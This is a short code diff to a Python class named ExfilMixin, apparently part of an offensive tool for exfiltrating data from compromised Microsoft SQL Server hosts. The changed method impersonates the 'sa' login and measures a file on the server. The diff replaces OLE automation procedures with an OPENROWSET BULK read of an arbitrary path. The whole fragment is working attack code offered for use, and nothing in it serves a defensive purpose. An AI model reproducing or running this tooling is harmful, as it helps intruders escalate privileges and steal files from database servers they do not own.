@@ -14,12 +14,8 @@ class ExfilMixin:
     def _get_remote_file_size(self, shell, remote_path: str) -> int | None:
         size_out = self._exec_q(shell,
             "EXECUTE AS LOGIN='sa';"
-            "DECLARE @fso INT,@f INT,@sz BIGINT;"
-            "EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUT;"
-            f"EXEC sp_OAMethod @fso,'GetFile',@f OUT,'{self._tsql_escape(remote_path)}';"
-            "EXEC sp_OAGetProperty @f,'Size',@sz OUT;"
-            "SELECT @sz AS file_size;"
-            "EXEC sp_OADestroy @fso;"
+            "SELECT DATALENGTH(BulkColumn) AS file_size "
+            f"FROM OPENROWSET(BULK '{self._tsql_escape(remote_path)}',SINGLE_BLOB) AS x;"
         )
         for line in (size_out or "").splitlines():
             s = line.strip()
